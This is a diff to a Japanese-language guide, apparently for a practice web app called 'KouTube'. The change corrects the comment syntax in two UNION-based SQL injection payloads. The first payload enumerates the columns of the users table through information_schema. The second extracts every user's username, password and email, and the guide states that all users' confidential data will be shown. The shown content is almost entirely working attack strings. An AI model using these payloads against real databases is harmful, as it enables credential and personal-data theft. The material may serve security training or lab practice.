@@ -28,7 +28,7 @@
 usersテーブルのカラム名を取得：
 
 ```sql
-' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(column_name), 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.columns WHERE table_schema = 'KouTube' AND table_name = 'users' --'
+' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(column_name), 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.columns WHERE table_schema = 'KouTube' AND table_name = 'users' -- '
 ```
 
 **期待される結果**: usersテーブルのカラム名（id, username, password, email等）が表示される
@@ -37,7 +37,7 @@ usersテーブルのカラム名を取得：
 ユーザー情報（ユーザー名、パスワード、メールアドレス）を取得：
 
 ```sql
-' AND 1=2 UNION SELECT id, id, CONCAT_WS('\n', username, password, email), '', '', 0, NOW() FROM users ORDER BY id ASC --'
+' AND 1=2 UNION SELECT id, id, CONCAT_WS('\n', username, password, email), '', '', 0, NOW() FROM users ORDER BY id ASC -- '
 ```
 
 **期待される結果**: 全ユーザーの機密情報が表示される
